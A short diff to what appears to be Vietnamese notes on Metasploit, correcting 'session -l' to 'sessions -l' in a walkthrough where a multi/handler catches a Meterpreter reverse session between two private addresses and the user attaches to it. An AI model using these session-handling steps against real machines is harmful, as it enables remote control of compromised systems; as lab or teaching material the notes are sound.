@@ -53,7 +53,7 @@ msf exploit(handler) > exploit -j
 [*] Meterpreter session 1 opened (192.168.22.105:3333 -> 192.168.22.106:49826) at 2025-01-23 05:17:18 -0500
 
 # Sau khi hiện các dòng trên thì liệt kê sessions và attach nếu ko thấy chữ meterpreter hiện 
-session -l
+sessions -l
 
 sessions -i 1
 [*] Starting interaction with 1...
